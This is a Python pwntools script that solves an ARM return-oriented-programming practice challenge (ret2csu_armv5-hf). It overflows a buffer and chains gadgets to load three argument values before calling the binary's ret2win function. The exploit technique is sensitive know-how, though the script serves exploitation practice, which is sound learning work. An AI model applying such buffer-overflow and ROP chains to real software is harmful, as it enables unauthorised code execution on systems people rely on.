from pwn import *

pop_r3_pc = 0x00010480 # pop {r3, pc}
mov_r0_r3_pop_fp_pc = 0x000105c8 # mov r0, r3 ; pop {fp, pc}
pop_many = 0x00010620 # pop {r1, r2, r4, r5, r6, r7, r8, ip, lr, pc}
ret2win_plt = 0x104a4


elf = ELF("./ret2csu_armv5-hf")
p = process(elf.path)

######################
p.recvuntil(b'> ')

buf = b'A' * 0x24
buf += p32(pop_r3_pc)
buf += p32(0xdeadbeef) # r3
buf += p32(mov_r0_r3_pop_fp_pc) # pc 
buf += p32(0xAAAA) # fp
buf += p32(pop_many) # pc
buf += p32(0xcafebabe) # r1
buf += p32(0xd00df00d) # r2
buf += p32(0xAAAA) # r4
buf += p32(0xAAAA) # r5
buf += p32(0xAAAA) # r6
buf += p32(0xAAAA) # r7
buf += p32(0xAAAA) # r8
buf += p32(0xAAAA) # ip
buf += p32(0xAAAA) # lr
buf += p32(ret2win_plt) # pc
p.send(buf)


p.interactive()
